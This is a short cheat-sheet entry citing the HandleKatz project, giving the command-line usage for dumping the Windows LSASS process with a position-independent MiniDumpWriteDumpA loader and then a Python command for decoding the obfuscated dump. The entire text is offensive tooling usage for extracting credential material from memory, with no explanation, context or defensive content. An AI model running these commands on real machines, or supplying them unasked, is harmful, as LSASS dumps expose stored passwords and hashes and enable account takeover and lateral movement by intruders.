### Source
https://github.com/codewhitesec/HandleKatz  

### Dump lsass process using ReactOS MiniDumpWriteDumpA as Position Independent Code
```
loader.exe --pid:<pid> --outfile:<outfile>.dmp
```

### Decode resulting dump
```
python3 Decoder.py -input <lsassDump>.dmp -output <outfile>.dmp
```

